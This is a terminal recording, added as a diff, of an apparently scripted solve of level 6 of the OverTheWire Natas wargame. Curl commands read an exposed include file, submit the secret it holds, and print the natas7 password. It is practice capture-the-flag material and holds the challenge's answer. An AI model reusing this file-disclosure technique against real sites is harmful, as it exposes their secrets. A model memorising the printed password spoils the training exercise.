@@ -1,0 +1,7 @@
+{"version":3,"term":{"cols":100,"rows":32},"timestamp":1793469347,"idle_time_limit":2.0,"command":"python3 -I /home/claude/tools/ptyrun_sh.py /home/claude/solves/natas/L6.sh","title":"Natas L6 solve","env":{"SHELL":"/bin/bash"}}
+[0.012, "o", "$ curl -s -u natas6:<pw> http://natas6.natas.labs.overthewire.org/index-source.html    # includes includes/secret.inc\r\r\n"]
+[0.803, "o", "includes/secret.inc\r\r\n$ curl -s -u natas6:<pw> http://natas6.natas.labs.overthewire.org/includes/secret.inc\r\r\n"]
+[0.559, "o", "<?\r\r\n$secret = \"FOEIUWGHFEEUHOFUOIU\";\r\r\n?>\r\r\n"]
+[0.001, "o", "$ curl -s -u natas6:<pw> -d \"secret=FOEIUWGHFEEUHOFUOIU&submit=1\" http://natas6.natas.labs.overthewire.org/\r\r\n"]
+[0.942, "o", "Access granted. The password for natas7 is B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0\r\r\n"]
+[0.002, "x", "0"]
